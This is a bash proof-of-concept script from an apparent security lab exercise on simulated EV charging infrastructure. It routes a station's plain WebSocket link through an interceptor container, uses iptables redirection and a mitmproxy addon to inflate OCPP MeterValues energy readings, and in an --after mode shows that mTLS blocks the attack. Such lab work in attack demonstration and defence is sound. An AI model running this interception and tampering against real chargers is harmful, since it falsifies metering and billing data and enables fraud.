#!/usr/bin/env bash
# Hijacking PoC 3: a routed interceptor on the plain-ws Aveiro charger<->edge link, built
# the way Guide 5 built its MitM lab (~/Desktop/ssle/practical/guides/g5/06_mitm_setup.sh,
# 07_mitm_http.sh, 09_cleanup_mitm.sh): a dedicated network with NO host IPv4 address, so
# the interceptor is the station's only route -- NOT ARP spoofing on the shared city
# bridge. See DESIGN-hijacking.md §"MitM in the plain city" and docs/interfaces.md v6
# 11.1 (plain city), 9.2/9.4 (sim), 16 (why only Aveiro is reachable this way: the city
# ACLs do not block a station from its own edge).
#
#   mitm_aveiro.sh [--station pt.aveiro.st-001] [--after] [--run] [--duration N]
#
# --after documents (and, with --run, exercises) the post-mitigation case: once Aveiro is
# switched to mTLS (gateway/deploy_edge.sh aveiro --tls, DESIGN-hijacking.md mitigation 3)
# the station only trusts the lab CA's edge certificate, the interceptor has no key the
# station will accept, so it cannot terminate or rewrite the link -- no plaintext to tag.
#
# Default: --dry-run. --run is refused unless EVCHARGE_BASELINE_DONE=1.
set -euo pipefail
# shellcheck source=./lib.sh
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

AFTER=0
CITY=aveiro  # this scenario only ever targets the plain-ws city

print_usage() {
  cat <<EOF
usage: $(basename "$0") [--station HIER_ID] [--after] [--run] [--duration SECONDS] [--dry-run]
EOF
  usage_common
}

ARGS=()
while [ $# -gt 0 ]; do
  case "$1" in
    --after) AFTER=1; shift ;;
    --city) echo "mitm_aveiro.sh always targets aveiro (the plain-ws city); ignoring --city" >&2; shift 2 ;;
    *) ARGS+=("$1"); shift ;;
  esac
done
parse_common_args "${ARGS[@]}"
is_plain_city "$CITY" || { echo "aveiro is no longer in PLAIN_WS_CITIES; this PoC needs --after semantics now" >&2; }

CHARGER="$STATION.cp-1"
EDGE_HOST="$(edge_host "$CITY")"
EDGE_URL="$(edge_url "$CITY")"
STATION_INST="$(station_instance "$STATION")"
NET_MITM="${CITY}-mitm"
INTERCEPTOR="${CITY}-interceptor"

# The isolated network's addresses are picked at run time, never written as literals here
# (same convention as infra/08_acls.sh, section 16: "addresses ... never written into the
# repo"). Three octets of a private /24 that Incus is not already using for city-$CITY.
MITM_OCTETS="10 240 $(( (RANDOM % 50) + 10 ))"
MITM_PREFIX="${MITM_OCTETS// /.}"
MITM_GW="$MITM_PREFIX.1"     # interceptor's address on the isolated side (station's gateway)
MITM_STATION="$MITM_PREFIX.10"  # station's address once moved onto the isolated network

PHASE_LABEL=""
if [ "$AFTER" = 1 ]; then PHASE_LABEL=" (after: mTLS)"; fi
echo "== hijacking PoC 3: routed MitM on the Aveiro plain-ws link$PHASE_LABEL =="
echo "  charger id       : $CHARGER"
echo "  edge url         : $EDGE_URL"
echo "  station          : $STATION_INST"
echo "  interceptor      : $INTERCEPTOR"
echo "  isolated network : $NET_MITM (ipv4.address=none: no host IP, no ARP spoofing needed)"
echo "  time-box         : ${DURATION}s"
if [ "$AFTER" = 1 ]; then
  echo "  expected         : the station's wss handshake only trusts the lab CA edge cert;"
  echo "                      the interceptor cannot present it, so mitmdump sees opaque TLS"
  echo "                      bytes it cannot parse or rewrite -- meter.anomaly (110116) stops"
else
  echo "  expected         : meter.anomaly (110116, plain city) on the rewritten MeterValues;"
  echo "                      the CSMS sees physically inconsistent readings, not proof of a"
  echo "                      MitM (inference from physics, per the design note)"
fi
echo

# Only ever invoked live, via run_cleanup's eval path (run_cleanup itself never evals a
# cleanup command in a dry run -- it only prints it -- so this never runs with DRY_RUN=1).
# Flushes the static config step 2 wrote and puts eth0 back exactly as it found it:
# restores the ORIGINAL (DHCP) /etc/systemd/network/eth0.network content captured into
# $ORIG_ETH0_NETWORK before it was overwritten, moves the device back to city-$CITY, and
# lets the station re-acquire a normal DHCP lease -- it does not rely on the move having
# failed, unlike before.
restore_station_network() {
  printf '%s\n' "$ORIG_ETH0_NETWORK" | incus exec "$STATION_INST" -- sh -c 'cat > /etc/systemd/network/eth0.network'
  incus config device set "$STATION_INST" eth0 network="city-$CITY"
  incus restart "$STATION_INST"
  wait_ready "$STATION_INST"
}

echo "-- 1. isolated network and interceptor (model: 06_mitm_setup.sh) --"
# Cleanup is registered one resource at a time, immediately after that resource's own
# live creation succeeds -- never upfront -- so a dry run never schedules a real undo and
# a failed create is never "undone". Registration order matches creation order, so
# run_cleanup's reverse (LIFO) replay still undoes everything in the correct order
# (model: 09_cleanup_mitm.sh).
if [ "$DRY_RUN" = 1 ]; then
  add_cleanup "incus network delete '$NET_MITM' >/dev/null 2>&1 || true"
  would "incus network create $NET_MITM ipv4.address=none ipv6.address=none"
else
  incus network create "$NET_MITM" ipv4.address=none ipv6.address=none
  add_cleanup "incus network delete '$NET_MITM' >/dev/null 2>&1 || true"
fi
if [ "$DRY_RUN" = 1 ]; then
  add_cleanup "incus delete -f '$INTERCEPTOR' >/dev/null 2>&1 || true"
  would "incus launch $CITY_IMG $INTERCEPTOR --network city-$CITY"
  would "wait_ready $INTERCEPTOR"
  would "incus config device add $INTERCEPTOR eth1 nic network=$NET_MITM name=eth1"
  would "configure $INTERCEPTOR:eth1 static $MITM_GW/24; sysctl ip_forward=1 (interceptor netns only)"
  would "apt-get install -y iptables on $INTERCEPTOR (the city image has no iptables/nft; the" \
        "transparent REDIRECT in step 3 needs it; fails loudly, does not proceed silently)"
  would "python3 -m venv /opt/mitm on $INTERCEPTOR; pip install mitmproxy==12.3.1 (pinned," \
        "see comment below); write /opt/mitm/meter_tag.py"
else
  incus launch "$CITY_IMG" "$INTERCEPTOR" --network "city-$CITY"
  add_cleanup "incus delete -f '$INTERCEPTOR' >/dev/null 2>&1 || true"
  wait_ready "$INTERCEPTOR"
  incus config device add "$INTERCEPTOR" eth1 nic network="$NET_MITM" name=eth1
  incus exec "$INTERCEPTOR" -- bash -c "cat > /etc/systemd/network/eth1.network <<EOF
[Match]
Name=eth1
[Network]
Address=$MITM_GW/24
EOF
networkctl reload"
  incus exec "$INTERCEPTOR" -- sysctl -w net.ipv4.ip_forward=1 net.ipv4.conf.all.send_redirects=0
  # The city image has neither iptables nor nft (confirmed read-only against a running
  # station of the same image); step 3's transparent REDIRECT needs one. No `|| true`
  # here: a failed install must abort the script loudly here, not surface later as a
  # confusing "Command not found" at the point the rule is actually added.
  incus exec "$INTERCEPTOR" -- bash -lc \
    'apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq iptables'
  # Pinned, not "latest": the addon below targets this exact version's WebSocketMessage
  # API (mitmproxy/websocket.py: .content is bytes, no implicit str encoding) and ctx.log
  # deprecation; pinning keeps that match stable instead of drifting under us.
  incus exec "$INTERCEPTOR" -- bash -lc \
    "python3 -m venv /opt/mitm && /opt/mitm/bin/pip install -q 'mitmproxy==12.3.1'"
fi

echo "-- 2. move the station onto the isolated network (its only NIC, like G5's mitm-client) --"
if [ "$DRY_RUN" = 1 ]; then
  would "incus exec $STATION_INST -- getent hosts $EDGE_HOST (resolve once while it still has" \
        "normal DNS; pinned into /etc/hosts below since aveiro-mitm has no DNS of its own)"
  add_cleanup "incus exec '$STATION_INST' -- systemctl enable --now evsim >/dev/null 2>&1 || true"
  would "incus exec $STATION_INST -- systemctl stop evsim"
  would "incus exec $STATION_INST -- systemctl disable evsim" \
        "(the service is ENABLED by default, so without this the incus restart below would" \
        "auto-start it again -- a second evsim for the same cp-1/cp-2, colliding with step 3's" \
        "own direct evsim as charger.duplicate_id and quarantining both. disable persists" \
        "across the reboot since it only removes the on-disk enablement symlink)"
else
  # Resolve the edge's real address while the station still has normal DNS (city-aveiro's
  # dnsmasq); pinned into /etc/hosts below so evsim can still find it once DNS itself is
  # gone on the isolated segment (aveiro-mitm has no dnsmasq -- ipv4.address=none disables
  # it entirely, by design, same as the station getting no general internet route).
  EDGE_IP="$(incus exec "$STATION_INST" -- getent hosts "$EDGE_HOST" | awk '{print $1}')"
  incus exec "$STATION_INST" -- systemctl stop evsim
  # Disabled so the `incus restart` a few lines down does NOT auto-start it (systemd
  # starts an ENABLED service on boot regardless of whether it was running when the
  # instance was last stopped) -- step 3's own direct evsim must be the only connection
  # for cp-1/cp-2, or the two collide as charger.duplicate_id and get quarantined, which
  # is exactly what happened before this fix. `enable --now` in cleanup puts the station
  # back exactly as found: enabled for future boots AND running immediately.
  incus exec "$STATION_INST" -- systemctl disable evsim
  add_cleanup "incus exec '$STATION_INST' -- systemctl enable --now evsim >/dev/null 2>&1 || true"
fi
if [ "$DRY_RUN" = 1 ]; then
  add_cleanup "restore_station_network || true"
  would "save $STATION_INST:/etc/systemd/network/eth0.network (original DHCP config, for restore)"
  would "append '<resolved $EDGE_HOST address> $EDGE_HOST' to $STATION_INST:/etc/hosts"
  would "write a static eth0.network on $STATION_INST: Address=$MITM_STATION/24 Gateway=$MITM_GW" \
        "(declarative, same mechanism already used for the interceptor's eth1 below)"
  would "incus config device set $STATION_INST eth0 network=$NET_MITM" \
        "(no device-level ipv4.address -- aveiro-mitm has DHCP disabled, so incus rejects a" \
        "static device address there; the static address/route live inside the instance instead)"
  would "incus restart $STATION_INST; wait_exec_ready $STATION_INST (not the DNS-based" \
        "wait_ready -- this isolated network has no route to the internet by design until the" \
        "interceptor forwards for it)"
else
  ORIG_ETH0_NETWORK="$(incus exec "$STATION_INST" -- cat /etc/systemd/network/eth0.network)"
  add_cleanup "restore_station_network || true"
  incus exec "$STATION_INST" -- sh -c "echo '$EDGE_IP $EDGE_HOST' >> /etc/hosts"
  incus exec "$STATION_INST" -- bash -c "cat > /etc/systemd/network/eth0.network <<EOF
[Match]
Name=eth0
[Network]
Address=$MITM_STATION/24
Gateway=$MITM_GW
EOF"
  incus config device set "$STATION_INST" eth0 network="$NET_MITM"
  incus restart "$STATION_INST"
  wait_exec_ready "$STATION_INST"
fi
if [ "$DRY_RUN" = 1 ]; then
  add_cleanup "incus exec '$CITY-edge' -- ip route del '$MITM_PREFIX.0/24' >/dev/null 2>&1 || true"
  would "incus exec $CITY-edge -- ip route replace $MITM_PREFIX.0/24 via <interceptor city-$CITY address>"
else
  INTERCEPTOR_CITY_IP="$(ipof "$INTERCEPTOR")"
  incus exec "$CITY-edge" -- ip route replace "$MITM_PREFIX.0/24" via "$INTERCEPTOR_CITY_IP"
  add_cleanup "incus exec '$CITY-edge' -- ip route del '$MITM_PREFIX.0/24' >/dev/null 2>&1 || true"
fi

# evsim's default --arrival-rate (6/hour) means a ~120s window has only a small chance
# of ever starting a charging session (MeterValues are only sent during one, per
# charger.py's _run_charging/_send_meter_values), and the normal systemd evsim.service
# gives no way to force one (force_session() is only wired to the botnet --compromised
# surge, and there is no remote-start CSMS API). So step 3 drives evsim directly for the
# window -- same mechanism rogue_dupe.sh/stolen_cert.sh already use -- instead of just
# restarting the persistent systemd service, with arguments chosen to make a session
# start almost immediately and outlast the whole window:
#   --arrival-rate 3600  mean wait for a session is 1s (exponential); P(no session in the
#                        first 10s) = e^-10 =~ 0.0045%, i.e. one starts almost at once.
#   --session-minutes    chosen so even the SHORTEST possible draw outlasts $DURATION:
#                        session length is log-normal clipped to [0.25x, 4x] the mean
#                        (driver.session_minutes), so 0.25 * SESSION_MIN * 60 > $DURATION
#                        guarantees the session cannot end before the window does.
#   --meter-interval 5   frequent MeterValues throughout, many chances for the rewrite
#                        below to land (and, in --after, many opaque-TLS samples to show
#                        found nothing).
# This does not touch the persistent evsim.service or its sim.env; the cleanup
# registered back in step 2 (`systemctl enable --now evsim`) still restores it
# afterwards exactly as before, since this is a one-off foreground run, not a systemd
# change. Step 2 also disabled (not just stopped) the service, so it does NOT auto-start
# on the `incus restart` the station move needs -- this run is the SOLE evsim for
# cp-1/cp-2 for the whole scenario, and it only starts below after the interceptor's
# REDIRECT rule and mitmdump are already up, so its connection is actually intercepted.
SESSION_MIN=$(( DURATION / 10 + 2 ))
FORCE_SESSION_ARGS=(--arrival-rate 3600 --meter-interval 5 --session-minutes "$SESSION_MIN")

if [ "$AFTER" = 1 ]; then
  echo "-- 3. after: Aveiro is mTLS, no plaintext redirect attempted --"
  if [ "$DRY_RUN" = 1 ]; then
    would "iptables -t nat REDIRECT tcp/443 on $INTERCEPTOR:eth1 -> :8080; mitmdump --mode transparent"
    would "incus exec -n -T $STATION_INST -- python -m evsim --roster /etc/evcharge/roster.yaml" \
          "--station $STATION --csms-url $EDGE_URL --pki-dir /etc/evcharge/pki --metrics-port 0" \
          "--duration $DURATION ${FORCE_SESSION_ARGS[*]} (forced session -- see comment above)"
    would "confirm: mitmdump cannot present the edge's certificate, the station's handshake fails" \
          "despite active charging traffic"
  else
    incus exec "$INTERCEPTOR" -- iptables -t nat -A PREROUTING -i eth1 -s "$MITM_STATION/32" \
      -p tcp --dport 443 -j REDIRECT --to-ports 8080
    incus exec "$INTERCEPTOR" -- bash -lc \
      'nohup /opt/mitm/bin/mitmdump --mode transparent --listen-port 8080 > /root/mitm.log 2>&1 &'
    run_evsim timeout "$((DURATION + 10))" incus exec -n -T "$STATION_INST" -- \
      /opt/evcharge/venv/bin/python -m evsim \
      --roster /etc/evcharge/roster.yaml --station "$STATION" --csms-url "$EDGE_URL" \
      --pki-dir /etc/evcharge/pki --metrics-port 0 --duration "$DURATION" "${FORCE_SESSION_ARGS[@]}"
    incus exec "$INTERCEPTOR" -- pkill -f '[m]itmdump' || true
  fi
else
  echo "-- 3. transparent redirect + MeterValues tagging addon (model: 07_mitm_http.sh) --"
  if [ "$DRY_RUN" = 1 ]; then
    would "write /opt/mitm/meter_tag.py on $INTERCEPTOR (rewrites Energy.Active.Import.Register" \
          "in OCPP MeterValues websocket frames, tags X-Intercepted-By-style via an extra field)"
    would "iptables -t nat REDIRECT tcp/80 on $INTERCEPTOR:eth1 -> :8080"
    would "mitmdump --mode transparent --listen-port 8080 -s /opt/mitm/meter_tag.py"
    would "incus exec -n -T $STATION_INST -- python -m evsim --roster /etc/evcharge/roster.yaml" \
          "--station $STATION --csms-url $EDGE_URL --pki-dir /etc/evcharge/pki --metrics-port 0" \
          "--duration $DURATION ${FORCE_SESSION_ARGS[*]} (forced session -- see comment above)"
  else
    incus exec "$INTERCEPTOR" -- bash -c "cat > /opt/mitm/meter_tag.py <<'PYEOF'
# Lab-only: proves the MitM can modify charger->CSMS MeterValues, not only read them.
#
# Targets mitmproxy==12.3.1 (pinned in the pip install below) -- its WebSocketMessage API
# (mitmproxy/websocket.py) types .content as bytes; assigning a str there is wrong (the
# .text property's own setter does the .encode() for you, .content has no such setter)
# and was the likely reason an earlier version of this addon silently failed to rewrite
# anything. ctx.log is also marked deprecated in this version ('Use Python's builtin
# logging module instead') in favour of the standard logging module used here.
import json
import logging

log = logging.getLogger('mitm_meter_tag')

# 5x the register: comfortably over CSMS_POWER_TOLERANCE (1.10, settings.py) even in the
# worst realistic case -- a 7.4kW car on a 22kW charger (driver.charger_power_w) delivers
# as little as ~0.882 * 7.4/22 =~ 29.7% of the charger's rated power; 5x that is ~148%,
# still past the 110% ceiling with margin. A previous 0.5 (1.5x) only reliably tripped
# meter.anomaly when the simulated car's power happened to be near the charger's rating
# (roughly 4 of the 6 car profiles in driver.CAR_POWER_KW); this is unconditional.
SCALE = 4.0  # inflates the energy register -- an unambiguously impossible reading

def load(loader):
    # Printed into /root/mitm.log: confirms the addon loaded at all, and with what SCALE,
    # regardless of whether any MeterValues ever arrive to rewrite.
    log.info('mitm_meter_tag: addon loaded, SCALE=%s', SCALE)

def websocket_message(flow):
    try:
        msgs = flow.websocket.messages
        if not msgs:
            return
        msg = msgs[-1]
        if not msg.from_client:
            return
        try:
            call = json.loads(msg.content)
        except ValueError:
            return
        if len(call) >= 4 and call[0] == 2 and call[2] == 'MeterValues':
            changed = False
            for mv in call[3].get('meterValue', []):
                for sv in mv.get('sampledValue', []):
                    if sv.get('measurand') == 'Energy.Active.Import.Register':
                        sv['value'] = str(int(int(sv['value']) * (1 + SCALE)))
                        changed = True
            if changed:
                msg.content = json.dumps(call).encode()
                log.info('mitm_meter_tag: rewrote MeterValues register x%s', 1 + SCALE)
    except Exception:
        # Never let an addon bug kill the flow (or silently vanish): logged, frame passes
        # through unmodified, and the next sample gets another chance.
        log.exception('mitm_meter_tag: error in websocket_message, frame left unmodified')
PYEOF"
    incus exec "$INTERCEPTOR" -- iptables -t nat -A PREROUTING -i eth1 -s "$MITM_STATION/32" \
      -p tcp --dport 80 -j REDIRECT --to-ports 8080
    incus exec "$INTERCEPTOR" -- bash -lc \
      'rm -f /root/mitm.log; nohup /opt/mitm/bin/mitmdump --mode transparent \
       --listen-port 8080 -s /opt/mitm/meter_tag.py > /root/mitm.log 2>&1 &'
    sleep 2
    run_evsim timeout "$((DURATION + 10))" incus exec -n -T "$STATION_INST" -- \
      /opt/evcharge/venv/bin/python -m evsim \
      --roster /etc/evcharge/roster.yaml --station "$STATION" --csms-url "$EDGE_URL" \
      --pki-dir /etc/evcharge/pki --metrics-port 0 --duration "$DURATION" "${FORCE_SESSION_ARGS[@]}"
    incus exec "$INTERCEPTOR" -- pkill -f '[m]itmdump' || true
  fi
fi

echo
echo "-- diagnostics: captured now, before cleanup deletes $INTERCEPTOR --"
if [ "$DRY_RUN" = 1 ]; then
  would "incus exec $INTERCEPTOR -- iptables -t nat -L PREROUTING -n -v" \
        "(packet/byte counters on the REDIRECT rule; zero packets means the station's" \
        "traffic never reached it -- a routing/interface problem, not an addon one)"
  would "incus exec $INTERCEPTOR -- ss -tlnp (confirm mitmdump was actually listening on :8080)"
  would "incus file pull $INTERCEPTOR/root/mitm.log /tmp/mitm-aveiro-mitmdump.log" \
        "(the addon's load line, any addon errors, and any 'rewrote MeterValues' lines)"
else
  echo "   iptables PREROUTING counters on $INTERCEPTOR:"
  incus exec "$INTERCEPTOR" -- iptables -t nat -L PREROUTING -n -v 2>&1 | sed 's/^/     /' || true
  echo "   listening sockets on $INTERCEPTOR:"
  incus exec "$INTERCEPTOR" -- ss -tlnp 2>&1 | sed 's/^/     /' || true
  echo "   pulling $INTERCEPTOR:/root/mitm.log (mitmdump's own log: addon load, addon errors," \
       "rewrite confirmations) ..."
  if incus file pull "$INTERCEPTOR/root/mitm.log" /tmp/mitm-aveiro-mitmdump.log >/dev/null 2>&1; then
    echo "   saved: /tmp/mitm-aveiro-mitmdump.log -- read this next, it is the single most" \
         "useful diagnostic for whether/why the rewrite did or didn't happen"
  else
    echo "   could not pull /root/mitm.log from $INTERCEPTOR (instance gone or file absent)" \
         "-- this itself is diagnostic: check the iptables/ss output above instead"
  fi
fi

echo
echo "mitm_aveiro: done (interceptor, isolated network and the station's networking will be" \
     "restored on exit)"
